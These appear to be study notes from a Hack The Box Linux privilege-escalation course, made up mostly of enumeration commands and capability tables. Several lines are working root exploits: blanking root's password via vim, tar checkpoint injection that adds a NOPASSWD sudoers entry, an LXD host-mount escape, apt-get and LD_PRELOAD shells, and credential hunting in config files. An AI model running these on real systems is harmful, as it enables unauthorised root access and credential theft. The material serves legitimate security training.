# Linux Priv Escalation

```shell-session
TCrypt@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
TCrypt@htb[/htb]$ cat /etc/passwd | head -n1
```

```shell-session
/usr/bin/vim.basic /etc/passwd
```

```shell-session
cat /etc/passwd | head -n1
```

```shell-session
getcap /usr/bin/vim.basic
```

```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

| **Capability**     | **Desciption**                                                                                                                                                                                                               |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

| `=`   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| ----- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `+ep` | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei` | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

| `cap_sys_admin`        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_chroot`       | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
| `cap_sys_ptrace`       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice`         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| `cap_sys_resource`     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
| `cap_sys_module`       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

```shell
grep -rw "flag" /var/log 2>/dev/null
```

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```

```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

```shell-session
lxc init alpine r00t -c security.privileged=true
```

```shell-session
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

```shell-session
lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

```shell-session
id

ADM = /var/log
```

```shell
find / -name *.sh 2>/dev/null | xargs cat | grep "HTB"

find / -name *.php 2>/dev/null | xargs cat | grep "DB_"
```

```shell-session
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

```shell-session
ls -la /etc/cron.daily/
```

```shell-session
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

```shell-session
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

```shell-session
ls -l /bin /usr/bin/ /usr/sbin/
```

```shell-session
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

```shell-session
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

```shell-session
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

```shell-session
ps aux | grep root
```

```shell-session
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

```shell-session
 find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

```shell-session
ls ~/.ssh
```

```shell-session
echo $PATH
```

```shell-session
pwd && conncheck 
```

```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH
```

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

{% code title="Restricted Shell Escape" %}
```shell-session
ls -l `pwd` 
```
{% endcode %}

```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```shell-session
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
|  `ps aux \| grep root`                                                              | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |
| `uname -a`                                                                          | Check the Kernel versiion                             |
| `cat /etc/lsb-release`                                                              | Check the OS version                                  |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of `Screen`               |
| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |
| `readelf -d payroll \| grep PATH`                                                   | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compiled a shared libary                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
| `./lynis audit system`                                                              |                                                       |
